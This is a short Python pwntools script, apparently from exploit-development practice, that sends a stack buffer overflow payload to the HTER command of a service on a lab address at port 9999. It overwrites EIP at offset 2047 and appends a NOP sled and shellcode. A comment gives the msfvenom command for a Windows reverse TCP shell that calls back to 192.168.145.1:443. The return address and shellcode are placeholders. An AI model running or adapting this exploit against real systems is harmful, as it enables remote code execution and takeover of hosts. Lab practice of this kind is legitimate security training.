#!/usr/bin/python3

from pwn import *

# target info
host = "192.168.145.129"
port = 9999

s = remote(host, port)

# phase 1: test offset
vulncmd = b"HTER "
cyclic_pattern = str.encode(cyclic(4000,"123456789ABCDEF")) # generate cyclic pattern as byte array

# phase 2 confirm EIP

crash = 4000
offset = 2047 # offset of EIP
junk = b"A" * offset
eip = b"BBBB" # To test if we successfully overwrite the EIP

# phase 3 exploit ;)

new_eip = p32(0x00000000) # p32 for little endian, but convert to hex because the app doesnt do that
nop_sled = b"90"*32 # just some NOPS to slide into my shellcode

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00" -f hex
shellcode = b"SHELLCODE"

# phase 2 payload
# payload = b"".join([
#     vulncmd,
#     cyclic_pattern
# ])quit

# phase 3 payload
payload = b"".join([
    vulncmd,
    junk,
    new_eip,
    nop_sled,
    shellcode
])

payload += b"C" * (crash - len(payload)) # padding

s.send(payload)
s.close()



